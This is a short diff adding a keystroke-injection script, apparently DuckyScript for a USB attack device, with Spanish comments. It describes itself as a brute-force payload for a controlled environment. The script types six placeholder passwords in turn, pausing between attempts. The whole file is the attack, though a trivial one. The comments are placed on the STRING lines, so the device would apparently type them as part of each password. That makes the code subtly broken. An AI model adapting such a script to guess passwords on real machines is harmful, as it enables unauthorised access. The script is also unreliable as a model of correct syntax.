@@ -1,0 +1,26 @@
+REM Payload de Fuerza Bruta para un entorno controlado
+DELAY 500               REM Pausa antes de iniciar
+
+STRING prueba1           REM Primer intento de contraseña
+ENTER
+DELAY 1000               REM Espera para que el sistema procese el intento
+
+STRING prueba2           REM Segundo intento de contraseña
+ENTER
+DELAY 1000
+
+STRING prueba3           REM Tercer intento de contraseña
+ENTER
+DELAY 1000
+
+STRING prueba4           REM Cuarto intento de contraseña
+ENTER
+DELAY 1000
+
+STRING prueba5           REM Quinto intento de contraseña
+ENTER
+DELAY 1000
+
+STRING prueba6           REM Sexto intento de contraseña
+ENTER
+DELAY 1000
